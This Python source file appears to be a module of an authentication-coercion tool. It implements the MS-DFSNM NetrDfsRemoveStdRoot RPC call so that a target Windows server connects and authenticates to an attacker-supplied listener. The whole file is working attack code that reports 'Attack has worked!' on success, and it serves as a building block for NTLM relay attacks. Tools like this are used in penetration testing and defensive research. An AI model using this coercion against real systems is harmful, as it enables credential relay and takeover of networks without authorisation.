#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : MS_DFSNM.py
# Author             : Podalirius (@podalirius_)
# Date created       : 6 Jul 2022


import sys
import time

from .RPCProtocol import RPCProtocol, DCERPCSessionError
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('ApiFlags', DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = ()


class MS_DFSNM(RPCProtocol):
    name = "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol"
    shortname = "MS-DFSNM"
    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
    version = "3.0"
    available_pipes = [r"\PIPE\netdfs"]

    def NetrDfsRemoveStdRoot(self, listener, max_retries=3):
        call_name, call_opnum = "NetrDfsRemoveStdRoot", 13
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = NetrDfsRemoveStdRoot()
                    request['ServerName'] = '%s\x00' % listener
                    request['RootShare'] = 'share\x00'
                    request['ApiFlags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("\x1b[1;91mERROR_INVALID_NAME\x1b[0m retrying in 20 seconds ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    @classmethod
    def list_coerce_methods(cls):
        return [
            ("NetrDfsRemoveStdRoot", 13, None)
        ]

    def perform_coerce_calls(self, listener):
        self.NetrDfsRemoveStdRoot(listener)
